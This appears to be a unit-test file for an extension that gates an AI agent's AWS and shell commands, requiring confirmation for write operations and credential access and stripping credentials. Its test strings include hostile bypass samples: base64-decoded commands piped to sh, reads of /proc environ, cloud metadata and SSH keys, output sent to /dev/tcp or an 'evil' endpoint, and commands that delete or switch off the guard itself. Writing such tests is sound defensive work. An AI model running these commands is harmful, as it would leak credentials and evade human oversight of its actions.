// aws-ops-guard 分类逻辑单元测试：node --experimental-strip-types --test tests/guard/
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  classifyOperation,
  analyzeRunScript,
  analyzeBashCommand,
  analyzePresignedUrl,
  classifyMcpTool,
  isProtectedPath,
  isCredentialPath,
  assessBashCommand,
  decideBash,
  withoutAwsCredentials,
} from "../../extensions/aws-ops-guard/classify.ts";
import { mkdtempSync, writeFileSync, chmodSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { execFileSync, spawnSync } from "node:child_process";

test("classifyOperation: 读前缀放行，其余视为写", () => {
  for (const op of ["GetCostAndUsage", "ListBuckets", "DescribeAlarms", "LookupEvents", "FilterLogEvents", "BatchGetItem", "SimulatePrincipalPolicy", "HeadObject", "StartQuery", "StopQuery"]) {
    assert.equal(classifyOperation(op), "read", op);
  }
  for (const op of ["PutMetricAlarm", "DeleteAlarms", "CreateBudget", "TerminateInstances", "StartQueryExecution", "Getaway", "TestInvokeMethod", "SetAlarmState"]) {
    assert.equal(classifyOperation(op), "write", op);
  }
});

test("analyzeRunScript: 只读成本查询无写操作", () => {
  const code = `
response = await call_boto3(
    service_name="ce",
    operation_name="GetCostAndUsage",
    region_name="us-east-1",
    params={"Granularity": "MONTHLY"},
)
alarms = await call_boto3(service_name='cloudwatch', operation_name='DescribeAlarms')
result = {"r": response}
result`;
  const r = analyzeRunScript(code);
  assert.deepEqual(r.writes, []);
  assert.deepEqual(r.reads.sort(), ["ce:GetCostAndUsage", "cloudwatch:DescribeAlarms"]);
});

test("analyzeRunScript: 识别创建告警等写操作", () => {
  const code = `
await call_boto3(service_name="cloudwatch", operation_name="DescribeAlarms")
await call_boto3(service_name="cloudwatch", operation_name="PutMetricAlarm", params={"AlarmName": "cpu-high"})
await call_boto3(operation_name="Publish", service_name="sns")`;
  const r = analyzeRunScript(code);
  assert.deepEqual(r.writes, ["cloudwatch:PutMetricAlarm", "sns:Publish"]);
});

test("analyzeRunScript: 动态操作名视为写（默认拒绝策略）", () => {
  const code = `
for op in ["DescribeAlarms", "DeleteAlarms"]:
    await call_boto3(service_name="cloudwatch", operation_name=op)`;
  const r = analyzeRunScript(code);
  assert.ok(r.writes.some((w) => w.includes("动态")), JSON.stringify(r));
});

test("analyzeRunScript: 通过 ** 展开参数调用视为写", () => {
  const r = analyzeRunScript(`kw = {"service_name": "ec2", "operation_name": "TerminateInstances"}\nawait call_boto3(**kw)`);
  assert.ok(r.writes.length > 0);
});

test("analyzeRunScript: snake_case 操作名同样分类", () => {
  const r = analyzeRunScript(`await call_boto3(service_name="ec2", operation_name="terminate_instances")`);
  assert.deepEqual(r.writes, ["ec2:TerminateInstances"]);
});

test("analyzeRunScript: 辅助模块按动词分类", () => {
  assert.deepEqual(analyzeRunScript(`r = await aws_serverless.diagnose(function_name="f")\nr2 = await aws_mcp.search_functions("x")`).writes, []);
  const r = analyzeRunScript(`await aws_serverless.redeploy_function(function_name="f")`);
  assert.deepEqual(r.writes, ["aws_serverless.redeploy_function"]);
});

test("analyzeRunScript: asyncio.gather 等标准库不误报", () => {
  const code = `
tasks = [call_boto3(service_name="ec2", operation_name="DescribeInstances", region_name=r) for r in regions]
results = await asyncio.gather(*tasks, return_exceptions=True)`;
  assert.deepEqual(analyzeRunScript(code).writes, []);
});

test("analyzeBashCommand: 只读 CLI 放行", () => {
  for (const cmd of [
    "aws ce get-cost-and-usage --time-period Start=2026-11-01,End=2026-11-11 --granularity MONTHLY --metrics UnblendedCost",
    "aws --region us-east-1 cloudwatch describe-alarms --output table",
    "aws --debug sts get-caller-identity",
    "aws s3 ls s3://bucket/",
    "aws logs tail /aws/lambda/fn --since 1h",
    "aws ec2 wait instance-running --instance-ids i-1",
    "echo hi && ls -la",
    "aws configure list",
    "aws cloudwatch help",
  ]) {
    assert.deepEqual(analyzeBashCommand(cmd), [], cmd);
  }
});

test("analyzeBashCommand: 识别 CLI 写操作（含全局参数、管道、子 shell）", () => {
  assert.deepEqual(analyzeBashCommand("aws cloudwatch put-metric-alarm --alarm-name x"), ["cloudwatch put-metric-alarm"]);
  assert.deepEqual(analyzeBashCommand("aws --profile prod --region eu-west-1 ec2 terminate-instances --instance-ids i-1"), ["ec2 terminate-instances"]);
  assert.deepEqual(analyzeBashCommand("x=$(aws ec2 describe-instances); aws ec2 stop-instances --instance-ids $x"), ["ec2 stop-instances"]);
  assert.deepEqual(analyzeBashCommand("aws ec2 --region us-east-1 delete-volume --volume-id v"), ["ec2 delete-volume"]);
  assert.deepEqual(analyzeBashCommand("aws s3 rm s3://b/k"), ["s3 rm"]);
  assert.deepEqual(analyzeBashCommand("/usr/local/bin/aws budgets create-budget --account-id 1"), ["budgets create-budget"]);
  assert.deepEqual(analyzeBashCommand('aws "$SVC" "$OP"'), ["$SVC $OP（动态）"]);
});

test("analyzeBashCommand: IaC 部署、boto3 脚本与篡改护栏需确认", () => {
  assert.deepEqual(analyzeBashCommand("cdk deploy --all"), ["cdk deploy"]);
  assert.deepEqual(analyzeBashCommand("terraform -chdir=infra apply -auto-approve"), ["terraform apply"]);
  assert.deepEqual(analyzeBashCommand("sam deploy --guided"), ["sam deploy"]);
  assert.ok(analyzeBashCommand(`python3 -c "import boto3; boto3.client('ec2').terminate_instances(InstanceIds=['i'])"`).length > 0);
  assert.ok(analyzeBashCommand("rm -rf ~/.pi/agent/extensions/aws-ops-guard").length > 0);
  assert.ok(analyzeBashCommand("export PI_AWS_OPS_GUARD=off").length > 0);
  assert.deepEqual(analyzeBashCommand("terraform plan"), []);
});

test("analyzePresignedUrl: upload 视为写，download 放行", () => {
  assert.deepEqual(analyzePresignedUrl({ requests: [{ operation: "download", bucket: "b", key: "k" }] }), []);
  assert.deepEqual(analyzePresignedUrl({ requests: [{ operation: "upload", bucket: "b", key: "k" }] }), ["s3 upload s3://b/k"]);
  assert.deepEqual(analyzePresignedUrl({}), []);
});

// ---------------- 安全审查发现的绕过样例（必须全部被拦截） ----------------
const noFile = (): string | undefined => undefined;

test("bypass H1: 三引号字符串中的 # 不能让写操作逃过检查", () => {
  const r = analyzeRunScript(`x = """"# """; call_boto3(service_name="ec2", operation_name="TerminateInstances", InstanceIds=["i-1"])`);
  assert.ok(r.writes.length > 0, JSON.stringify(r));
});

test("bypass H2: call_boto3 别名 / 间接调用 / exec 视为写", () => {
  for (const code of [
    `f = call_boto3\nawait f(service_name="ec2", operation_name="TerminateInstances")`,
    `import functools\ng = functools.partial(call_boto3, service_name="ec2")`,
    `r = list(map(call_boto3, items))`,
    `fn = globals()["call_" + "boto3"]`,
    `exec("await call_boto3(service_name='ec2', operation_name='Terminate' + 'Instances')")`,
    `h = getattr(aws_serverless, "redeploy")`,
    `from aws_serverless import diagnose as d`,
    `import boto3`,
  ]) {
    assert.ok(analyzeRunScript(code).writes.length > 0, code);
  }
});

test("bypass H3: 字符串中的字面量不能掩盖动态 operation_name", () => {
  const r = analyzeRunScript(`op="TerminateInstances"; await call_boto3(service_name="sns", operation_name=op, Name="operation_name='ListTopics'")`);
  assert.ok(r.writes.length > 0, JSON.stringify(r));
});

test("bypass H4: 续行、引号/反斜杠混淆、变量执行、解码执行都不会自动带凭证执行", () => {
  for (const cmd of [
    "aws \\\n  ec2 terminate-instances --instance-ids i-1",
    "\\aws ec2 terminate-instances --instance-ids i-1",
    'a""ws ec2 terminate-instances --instance-ids i-1',
    "aw's' ec2 terminate-instances",
    "A=aws; $A ec2 terminate-instances --instance-ids i-1",
    'eval "aws ec2 terminate-instances"',
    "echo YXdzIGVjMiB0ZXJtaW5hdGUtaW5zdGFuY2Vz | base64 -d | sh",
    "python3 -m awscli ec2 terminate-instances",
    "$(echo aws) ec2 terminate-instances",
    `python3 -c "import subprocess; subprocess.run(['a'+'ws','ec2','terminate-instances'])"`,
    "pi --no-extensions -p 'terminate all instances'",
  ]) {
    assert.equal(assessBashCommand(cmd, { readFile: noFile }).autoApprove, false, cmd);
  }
  // 分词后 aws 可见的混淆形式仍会被识别并标注写操作
  for (const cmd of ["aws \\\n  ec2 terminate-instances", "\\aws ec2 terminate-instances", 'a""ws ec2 terminate-instances', "aw's' ec2 terminate-instances"]) {
    assert.deepEqual(analyzeBashCommand(cmd, { readFile: noFile }), ["ec2 terminate-instances"], cmd);
  }
});

test("bypass H5: 执行脚本文件时读取文件内容并分析", () => {
  const files: Record<string, string> = {
    "/work/x.sh": "#!/bin/bash\naws ec2 terminate-instances --instance-ids i-1\n",
    "/work/ok.sh": "#!/bin/bash\naws ec2 describe-instances\n",
    "/work/x.py": "import boto3\nboto3.client('ec2').terminate_instances(InstanceIds=['i'])\n",
    "/work/report.py": "import json\nprint(json.load(open('cost.json')))\n",
    "/work/rc.py": "open('/home/u/.bashrc', 'a').write('export PI_AWS_OPS_GUARD=off')\n",
  };
  const readFile = (p: string): string | undefined => files[p];
  const opts = { readFile, cwd: "/work", home: "/home/u" };
  assert.ok(analyzeBashCommand("bash /work/x.sh", opts).length > 0);
  assert.ok(analyzeBashCommand("sh x.sh", opts).length > 0);
  assert.ok(analyzeBashCommand("./x.sh", opts).length > 0);
  assert.ok(analyzeBashCommand("python3 x.py", opts).length > 0);
  assert.ok(analyzeBashCommand("python3 rc.py", opts).length > 0, "脚本内容访问受保护位置");
  assert.equal(assessBashCommand("bash missing.sh", opts).autoApprove, false, "读不到的脚本不带凭证执行");
  assert.deepEqual(analyzeBashCommand("bash ok.sh", opts), []);
  assert.deepEqual(analyzeBashCommand("python3 report.py", opts), []);
  assert.deepEqual(decideBash(assessBashCommand("python3 report.py", opts), { awsPath: "/usr/local/bin/aws" }), { action: "run-without-credentials" });
});

test("bypass H6: 受保护路径规范化（..、//、相对路径）与 shell 启动文件", () => {
  const home = "/home/u";
  assert.ok(isProtectedPath("/home/u/.pi/agent/../agent/extensions/aws-ops-guard/index.ts", home, "/tmp"));
  assert.ok(isProtectedPath("/home/u/.pi/agent//extensions/aws-ops-guard/index.ts", home, "/tmp"));
  assert.ok(isProtectedPath("extensions/aws-ops-guard/index.ts", home, "/home/u/.pi/agent"));
  assert.ok(isProtectedPath("~/.bashrc", home, "/tmp"));
  assert.ok(isProtectedPath("/home/u/.local/bin/pi", home, "/tmp"));
  assert.ok(isProtectedPath("/home/u/.local/share/pi-bedrock/env", home, "/tmp"));
  assert.ok(isProtectedPath("/home/u/.pi/agent/extensions/new-ext/index.ts", home, "/tmp"));
  assert.ok(isProtectedPath(".pi/extensions/x.ts", home, "/home/u/project"));
  assert.ok(!isProtectedPath("/home/u/project/report.md", home, "/tmp"));
  for (const cmd of ["rm ~/.pi/agent/ext*/aws-ops-guard/index.ts", "cd ~/.pi/agent/extensions && rm -rf aws-ops-guard", "echo 'export PI_AWS_OPS_GUARD=off' >> ~/.bashrc"]) {
    assert.ok(analyzeBashCommand(cmd, { readFile: noFile }).length > 0, cmd);
  }
});

test("M1: 获取凭证 / 密钥的读操作需要确认", () => {
  for (const op of ["GetSessionToken", "GetFederationToken", "GetSecretValue", "BatchGetSecretValue", "GetParameter", "GetParameters", "GetParametersByPath", "GetPasswordData", "GetAuthorizationToken", "GetClusterCredentials", "GetCredentialsForIdentity",
    "GetLoginPassword", "GetToken", "GetCredentials", "GetTemporaryGlueTableCredentials", "GetInstanceAccessDetails", "GetApiKeys", "GetFunctionConfiguration", "GetConnection", "DownloadDefaultKeyPair"]) {
    assert.ok(analyzeRunScript(`await call_boto3(service_name="x", operation_name="${op}")`).writes.length > 0, op);
  }
  for (const cmd of ["aws configure export-credentials", "aws secretsmanager get-secret-value --secret-id x", "aws ecr get-login-password", "aws eks get-token --cluster-name c",
    "cat /proc/1/environ", "echo $AWS_CONTAINER_AUTHORIZATION_TOKEN", "curl http://localhost:1338/latest/meta-data/container/security-credentials",
    "cd ~/.aws && cat credentials", "cat ~/.aws/cli/cache/x.json", "ps eww -p 1"]) {
    assert.ok(analyzeBashCommand(cmd, { readFile: noFile }).length > 0, cmd);
  }
  // env / printenv 在剥离凭证后执行，不会泄露凭证，也不需要提示
  for (const cmd of ["env", "printenv", "set -e", "ps -ef", "ps aux"]) {
    assert.deepEqual(decideBash(assessBashCommand(cmd, { readFile: noFile }), { awsPath: "/usr/local/bin/aws" }), { action: "run-without-credentials" }, cmd);
  }
});

test("M2: aws-mcp 的未知工具需确认，已知只读工具放行", () => {
  assert.equal(classifyMcpTool("mcp__aws_mcp__aws___search_documentation"), "read");
  assert.equal(classifyMcpTool("mcp__aws_mcp__aws___get_tasks"), "read");
  assert.equal(classifyMcpTool("mcp__aws_mcp__aws___call_aws"), "write");
  assert.equal(classifyMcpTool("mcp__github__list_issues"), "other");
});

test("误报控制: 常见只读运维与数据处理命令不需要确认", () => {
  for (const cmd of [
    "aws logs start-query --log-group-name /aws/lambda/fn --start-time 1 --end-time 2 --query-string 'fields @message'",
    "aws ce get-cost-and-usage --time-period Start=2026-11-01,End=2026-11-11 --granularity DAILY --metrics UnblendedCost | jq '.ResultsByTime'",
    "aws cloudwatch get-metric-data --metric-data-queries file://q.json --start-time 2026-11-10T00:00:00Z --end-time 2026-11-11T00:00:00Z > out.json",
    "python3 - <<'EOF'\nimport json\nprint(json.load(open('out.json')))\nEOF",
    "cat out.json | python3 -c 'import json,sys; print(len(json.load(sys.stdin)))'",
    "ls -la /tmp && grep -r ERROR logs/ | head",
    "env AWS_REGION=us-west-2 aws ec2 describe-instances",
  ]) {
    assert.deepEqual(analyzeBashCommand(cmd, { readFile: noFile }), [], cmd);
  }
  assert.deepEqual(analyzeRunScript(`# 稍后可能需要 PutMetricAlarm，但本脚本只读\nr = await call_boto3(service_name="cloudwatch", operation_name="DescribeAlarms")`).writes, []);
});

// ---------------- 代码审查发现的问题 ----------------
test("IaC: 前置无值参数与更多工具", () => {
  assert.deepEqual(analyzeBashCommand("pulumi --non-interactive up", { readFile: noFile }), ["pulumi up"]);
  assert.deepEqual(analyzeBashCommand("cdk --no-version-reporting deploy", { readFile: noFile }), ["cdk deploy"]);
  assert.ok(analyzeBashCommand("terragrunt run-all apply", { readFile: noFile }).length > 0);
  assert.deepEqual(analyzeBashCommand("sls deploy --stage prod", { readFile: noFile }), ["sls deploy"]);
  assert.deepEqual(analyzeBashCommand("terraform plan -out apply.plan", { readFile: noFile }), []);
});

test("误报控制: 下载、只读 SQL、提交信息、重定向", () => {
  for (const cmd of [
    "aws s3 cp s3://bucket/report.csv ./report.csv",
    "aws s3 sync s3://bucket/cur/ ./cur --exclude '*' --include '*.parquet'",
    `aws athena start-query-execution --query-string "SELECT line_item_product_code, sum(line_item_unblended_cost) FROM cur GROUP BY 1" --work-group primary`,
    "git commit -m 'fix aws s3 sync'",
    "cat settings.json 2>&1",
    "aws logs start-live-tail --log-group-identifiers arn:aws:logs:us-east-1:1:log-group:x",
  ]) {
    assert.deepEqual(analyzeBashCommand(cmd, { readFile: noFile }), [], cmd);
  }
  assert.ok(analyzeBashCommand("aws s3 cp ./local.txt s3://bucket/x", { readFile: noFile }).length > 0);
  assert.ok(analyzeBashCommand(`aws athena start-query-execution --query-string "CREATE TABLE t AS SELECT 1"`, { readFile: noFile }).length > 0);
  assert.ok(analyzeBashCommand("pi -p -ne 'x'", { readFile: noFile }).length > 0);
  assert.ok(analyzeBashCommand("sed -i 's/x/y/' ~/.pi/agent/AGENTS.md", { readFile: noFile }).length > 0);
});

test("run_script: Athena 只读 SQL 视为读，含写入语句或动态 SQL 视为写", () => {
  const read = `await call_boto3(service_name="athena", operation_name="StartQueryExecution", params={"QueryString": "SELECT 1 FROM cur", "WorkGroup": "primary"})`;
  assert.deepEqual(analyzeRunScript(read).writes, []);
  const ctas = `await call_boto3(service_name="athena", operation_name="StartQueryExecution", params={"QueryString": "CREATE TABLE x AS SELECT 1"})`;
  assert.deepEqual(analyzeRunScript(ctas).writes, ["athena:StartQueryExecution"]);
  const dynamic = `q = build()\nawait call_boto3(service_name="athena", operation_name="StartQueryExecution", params={"QueryString": q})`;
  assert.deepEqual(analyzeRunScript(dynamic).writes, ["athena:StartQueryExecution"]);
});

// ---------------- 凭证默认剥离 + 严格白名单（对抗性审查后的安全模型） ----------------
const assess = (cmd: string) => assessBashCommand(cmd, { readFile: noFile, cwd: "/home/u/work", home: "/home/u" });
const AWS_PATH = "/usr/local/bin/aws";
const decide = (cmd: string) => decideBash(assess(cmd), { awsPath: AWS_PATH });

test("严格白名单：常见只读 aws CLI 自动带凭证执行", () => {
  for (const cmd of [
    "aws sts get-caller-identity",
    "aws sts get-caller-identity --query Account --output text",
    "aws ce get-cost-and-usage --time-period Start=2026-11-01,End=2026-11-11 --granularity MONTHLY --metrics UnblendedCost --group-by Type=DIMENSION,Key=SERVICE | jq '.ResultsByTime[0].Groups | sort_by(.Metrics.UnblendedCost.Amount)'",
    "aws cloudwatch describe-alarms --state-value ALARM --query 'MetricAlarms[*].[AlarmName,StateReason]' --output table",
    "AWS_REGION=us-west-2 aws ec2 describe-instances --output json > instances.json",
    "AWS_PAGER= aws cloudwatch list-metrics --namespace AWS/EC2",
    "aws logs start-query --log-group-name /aws/lambda/fn --start-time 1 --end-time 2 --query-string 'fields @timestamp, @message | filter @message like /ERROR/'",
    `aws athena start-query-execution --query-string "SELECT product, sum(cost) FROM cur GROUP BY 1" --work-group primary`,
  ]) {
    const a = assess(cmd);
    assert.equal(a.autoApprove, true, cmd);
    assert.equal(decide(cmd).action, "run-with-credentials", cmd);
  }
});

test("严格白名单之外的 aws 命令需要确认才带凭证（循环、子 shell、危险参数、敏感操作、管道到命令）", () => {
  for (const cmd of [
    "for v in a b; do aws ec2 describe-vpcs --vpc-ids $v; done",
    "aws ec2 describe-instances; aws ec2 terminate-instances --instance-ids i-1",
    "aws ec2 describe-instances --region $(cat region.txt)",
    "aws --debug sts get-caller-identity",
    "aws --endpoint-url http://evil sts get-caller-identity",
    "aws ecr get-login-password",
    "aws s3 cp s3://b/k ./k",
    "aws ec2 describe-instances | sh",
    "aws ec2 describe-instances | xargs -n1 echo",
    "aws ec2 describe-instances > ~/.bashrc",
    "aws ec2 describe-instances | grep x ~/.aws/credentials",
    "aws ec2 describe-instances && echo done",
    "AWS_PAGER=sh aws ec2 describe-instances",
    "AWS_PAGER=less aws ec2 describe-instances",
    "AWS_DEFAULT_OUTPUT=x aws ec2 describe-instances",
    "PATH=/tmp/evil aws ec2 describe-instances",
  ]) {
    assert.equal(decide(cmd).action, "confirm", cmd);
  }
});

test("对抗性审查绕过样例：都不会在无人确认时带凭证执行", () => {
  const files: Record<string, string> = { "/home/u/work/benign.sh": "echo hi\n", "/home/u/work/sub/run.sh": "aws s3 rb s3://b\n" };
  const opts = { readFile: (p: string) => files[p], cwd: "/home/u/work", home: "/home/u" };
  for (const cmd of [
    "for v in a b; do aws ec2 delete-vpc --vpc-id $v; done",
    "if true; then aws ec2 delete-vpc --vpc-id v; fi",
    "f(){ aws ec2 delete-vpc --vpc-id v; }; f",
    "! aws ec2 delete-vpc --vpc-id v",
    "find . -exec aws s3 rm s3://b/x \;",
    "/usr/bin/env aws ec2 delete-vpc --vpc-id v",
    "/usr/bin/timeout 30 aws ec2 delete-vpc --vpc-id v",
    `python3 -c "import asyncio;asyncio.run(asyncio.create_subprocess_shell('aws s3 rb s3://b'))"`,
    "aws s3 sync ./d --delete s3://b/",
    "aws s3 cp /tmp/f --only-show-errors s3://b/k",
    "echo 'aws ec2 delete-vpc --vpc-id v' > benign.sh && bash benign.sh",
    "cd sub && bash run.sh",
    "pip install --user foo",
    `aws athena start-query-execution --query-string "SELECT 1; DROP TABLE t"`,
    `aws redshift-data execute-statement --sql "SELECT * INTO newt FROM t"`,
  ]) {
    const a = assessBashCommand(cmd, opts);
    assert.notEqual(decideBash(a, { awsPath: AWS_PATH }).action, "run-with-credentials", cmd);
  }
  // 对审查中可见的 AWS 写操作，确认框中会给出具体操作
  assert.ok(analyzeBashCommand("for v in a b; do aws ec2 delete-vpc --vpc-id $v; done", opts).includes("ec2 delete-vpc"));
  assert.ok(analyzeBashCommand("find . -exec aws s3 rm s3://b/x \;", opts).includes("s3 rm"));
  assert.ok(analyzeBashCommand("/usr/bin/env aws ec2 delete-vpc --vpc-id v", opts).includes("ec2 delete-vpc"));
  assert.ok(analyzeBashCommand("aws s3 sync ./d --delete s3://b/", opts).includes("s3 sync"));
});

test("凭证剥离：未授权命令在 bash 中看不到任何 AWS 凭证变量", () => {
  const env = {
    PATH: process.env.PATH ?? "/usr/bin:/bin",
    AWS_CONTAINER_CREDENTIALS_FULL_URI: "http://localhost:1338/x", AWS_CONTAINER_AUTHORIZATION_TOKEN: "secret-token",
    AWS_ACCESS_KEY_ID: "AKIA", AWS_SECRET_ACCESS_KEY: "s", AWS_SESSION_TOKEN: "t", AWS_PROFILE: "p", AWS_REGION: "us-east-1",
  };
  const out = execFileSync("bash", ["-c", withoutAwsCredentials("env")], { env, encoding: "utf8" });
  assert.ok(!/secret-token|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|AWS_CONTAINER_CREDENTIALS_FULL_URI|AWS_PROFILE=/.test(out), out);
  assert.match(out, /AWS_REGION=us-east-1/);
  assert.match(out, /AWS_SHARED_CREDENTIALS_FILE=\/dev\/null/);
  assert.match(out, /AWS_EC2_METADATA_DISABLED=true/);
});

test("run_script: 字面量必须完整（拒绝拼接 / 条件表达式），SQL 按调用判断", () => {
  for (const code of [
    `await call_boto3(service_name="s3", operation_name="GetObject" if x else "DeleteBucket")`,
    `await call_boto3(service_name="ec2", operation_name="Describe" + x)`,
    `await call_boto3(service_name="athena", operation_name="StartQueryExecution", params={"QueryString": "SELECT 1" + "; DROP TABLE x"})`,
    `await call_boto3(service_name="athena", operation_name="StartQueryExecution", params={"QueryString": "SELECT 1" if a else "CREATE TABLE t AS SELECT 1"})`,
    `# {"Sql": "SELECT 1"}\nawait call_boto3(service_name="dynamodb", operation_name="ExecuteStatement", params={"Statement": "DELETE FROM t WHERE k='a'"})`,
    `await call_boto3(service_name="athena", operation_name="StartQueryExecution", params={"QueryString": "EXPLAIN ANALYZE INSERT INTO t SELECT 1"})`,
  ]) {
    assert.ok(analyzeRunScript(code).writes.length > 0, code);
  }
  const tripleQuoted = `q = await call_boto3(service_name="athena", operation_name="StartQueryExecution", params={"QueryString": """
SELECT line_item_product_code, REPLACE(product_region, '-', '_') AS r, sum(cost)
FROM cur WHERE month = '11' GROUP BY 1, 2
""", "WorkGroup": "primary"})`;
  assert.deepEqual(analyzeRunScript(tripleQuoted).writes, []);
  assert.deepEqual(analyzeRunScript(`# 注意不要用 getattr\nr = await call_boto3(service_name="ce", operation_name="GetCostForecast", params={})`).writes, []);
});

test("读取凭证文件需要确认（read / grep / find / ls 工具）", () => {
  const home = "/home/u";
  for (const p of ["~/.aws/credentials", "/home/u/.aws/cli/cache/x.json", "/proc/self/environ", "/proc/1/environ", "/home/u/.pi/agent/auth.json", "../.aws/config"]) {
    assert.ok(isCredentialPath(p, home, "/home/u/work"), p);
  }
  for (const p of ["/home/u/work/report.csv", "/proc/cpuinfo", "/home/u/.pi/agent/AGENTS.md"]) {
    assert.ok(!isCredentialPath(p, home, "/home/u/work"), p);
  }
  assert.ok(isProtectedPath("~/.aws/config", home, "/tmp"));
  assert.ok(isProtectedPath("/home/u/.bashrc.d/x.sh", home, "/tmp"));
  assert.ok(isProtectedPath("/home/u/.zshenv", home, "/tmp"));
  assert.ok(isProtectedPath("/home/u/.bash_aliases", home, "/tmp"));
});

test("误报控制（对抗性审查列出的常见只读写法）", () => {
  for (const cmd of [
    `python3 -c "import json; d=json.load(open('c.json')); print(round(d['t']/1024,2))"`,
    `jq '(.X|tonumber)/1000' out.json`,
    `echo "Cost (USD/month)"`,
    `awk '{a=1; $2="x"; print}' data.txt`,
    "set -e",
    "aws s3 cp s3://b/k - | jq .",
  ]) {
    const decision = decide(cmd);
    assert.ok(decision.action !== "confirm" || cmd.startsWith("aws s3 cp"), `${cmd} → ${JSON.stringify(decision)}`);
  }
  assert.deepEqual(analyzeBashCommand("aws s3 cp s3://b/k - | jq .", { readFile: noFile }), []);
});

// ---------------- 第三轮审查：自动带凭证路径的加固 ----------------
test("自动路径：危险参数前缀、file:// 参数、outfile 操作、重复 SQL 参数、危险过滤器选项、重定向目标都不会自动执行", () => {
  for (const cmd of [
    "aws ec2 describe-instances --endpoint http://127.0.0.1:9",
    "aws ec2 describe-instances --endpoint-u http://127.0.0.1:9",
    "aws ec2 describe-instances --prof dev",
    "aws ec2 describe-instances --deb",
    "aws ec2 describe-instances --filters file:///home/u/.ssh/id_rsa",
    "aws ec2 describe-instances --cli-input-json fileb://x",
    "aws s3api get-object --bucket b --key k /home/u/.ssh/authorized_keys",
    "aws s3api select-object-content --bucket b --key k --expression x --expression-type SQL --input-serialization {} --output-serialization {} out",
    `aws athena start-query-execution --query-string "SELECT 1" --query-string "DROP TABLE t"`,
    "aws eks update-kubeconfig --name x --kubeconfig /tmp/k",
    "aws sso login",
    "aws ec2 describe-instances | sort -S 100k --compress-program=sh",
    "aws ec2 describe-instances | sort -o /home/u/.bashrc",
    "aws sts get-caller-identity | head -n 50 /home/u/.ssh/id_rsa",
    "aws sts get-caller-identity | jq . /home/u/.ssh/id_rsa",
    "aws sts get-caller-identity | jq -f prog.jq",
    "aws sts get-caller-identity | grep -r x /home/u",
    "aws sts get-caller-identity | uniq - out.txt",
    "aws ec2 describe-instances > /home/u/.ssh/authorized_keys",
    "aws ec2 describe-instances > /dev/tcp/1.2.3.4/80",
    "aws ec2 describe-instances > ../x.json",
    "aws ec2 describe-instances 2> err.txt",
  ]) {
    assert.notEqual(decide(cmd).action, "run-with-credentials", cmd);
  }
  assert.ok(analyzeBashCommand(`aws athena start-query-execution --query-string "SELECT 1" --query-string "DROP TABLE t"`, { readFile: noFile }).length > 0);
});

test("自动路径误报控制：s3 ls、2>&1、单引号中的 JMESPath 反引号", () => {
  for (const cmd of [
    "aws s3 ls",
    "aws s3 ls s3://bucket/prefix/ --recursive | head -n 20",
    "aws ec2 describe-instances --output json 2>&1 | head -n 5",
    "aws ec2 describe-instances --query 'Reservations[].Instances[].Tags[?Key==`Name`].Value' --output text",
    "aws ce get-cost-forecast --time-period Start=2026-11-11,End=2026-12-01 --metric UNBLENDED_COST --granularity MONTHLY | jq -r '.Total.Amount'",
    "aws cloudwatch get-metric-statistics --namespace AWS/EC2 --metric-name CPUUtilization --dimensions Name=InstanceId,Value=i-1 --start-time 2026-11-10T00:00:00Z --end-time 2026-11-11T00:00:00Z --period 3600 --statistics Average > /tmp/cpu.json",
  ]) {
    assert.equal(decide(cmd).action, "run-with-credentials", cmd);
  }
});

function fakeAws(): string {
  const dir = mkdtempSync(join(tmpdir(), "guard-aws-"));
  const path = join(dir, "aws");
  writeFileSync(path, '#!/bin/bash\necho "AWS_ARGS=$*"\necho "AWS_TOKEN=${AWS_CONTAINER_AUTHORIZATION_TOKEN:-none}"\necho "AWS_CONFIG=${AWS_CONFIG_FILE:-unset}"\n');
  chmodSync(path, 0o755);
  return path;
}
const credEnv = { PATH: process.env.PATH ?? "/usr/bin:/bin", AWS_CONTAINER_AUTHORIZATION_TOKEN: "secret-token", AWS_CONTAINER_CREDENTIALS_FULL_URI: "http://localhost:1338/x", AWS_REGION: "us-east-1" };

test("重建命令：只有 aws 进程拿到凭证，参数按校验结果原样传递", () => {
  const aws = fakeAws();
  const decision = decideBash(assess("aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId]' --output text"), { awsPath: aws });
  assert.equal(decision.action, "run-with-credentials");
  const command = (decision as { command: string }).command;
  const out = execFileSync("bash", ["-c", command], { env: credEnv, encoding: "utf8" });
  assert.match(out, /AWS_ARGS=ec2 describe-instances --query Reservations\[\*\]\.Instances\[\*\]\.\[InstanceId\] --output text/);
  assert.match(out, /AWS_TOKEN=secret-token/);
  assert.match(out, /AWS_CONFIG=\/dev\/null/);
  // 过滤器运行在无凭证环境中
  const filtered = decideBash(assess("aws sts get-caller-identity | grep -c secret"), { awsPath: aws }) as { command: string };
  // 用 env 替换过滤器，验证管道后的进程看不到凭证（env 不读 stdin，上游可能 SIGPIPE，因此不检查退出码）
  const viaFilter = spawnSync("bash", ["-c", filtered.command.replace(/'grep' '-c' 'secret'$/, "'env'")], { env: credEnv, encoding: "utf8" }).stdout;
  assert.match(viaFilter, /AWS_REGION=us-east-1/);
  assert.ok(!viaFilter.includes("secret-token"), viaFilter);
});

test("run_script: NFKC 规范化（全角标识符）与双下划线反射", () => {
  assert.ok(analyzeRunScript('await ｃall_boto3(service_name="s3", ｏperation_name="DeleteBucket", params={"Bucket":"x"})').writes.length > 0);
  assert.ok(analyzeRunScript("import ｓubprocess").writes.length > 0);
  assert.ok(analyzeRunScript('def f(): pass\ng = f.__globals__\nawait g["call_"+"boto3"](service_name="s3", operation_name="ListBuckets")').writes.length > 0);
  assert.deepEqual(analyzeRunScript('if __name__ == "__main__": pass\nr = await call_boto3(service_name="s3", operation_name="ListBuckets")').writes, []);
});

test("审计日志脱敏：访问密钥、密码 / 令牌参数", async () => {
  const { redact } = await import("../../extensions/aws-ops-guard/classify.ts");
  const out = redact(`aws iam create-access-key; export AWS_SECRET_ACCESS_KEY=abc123 AKIAABCDEFGHIJKLMNOP --master-user-password Hunter2 {"SecretString": "s3cr3t", "Token":"tok"} --secret-string xyz`);
  for (const leaked of ["abc123", "ABCDEFGHIJKLMNOP", "Hunter2", "s3cr3t", "tok\"", "xyz"]) assert.ok(!out.includes(leaked), `${leaked} in ${out}`);
  assert.equal(redact("aws ce get-cost-and-usage --granularity DAILY"), "aws ce get-cost-and-usage --granularity DAILY");
});
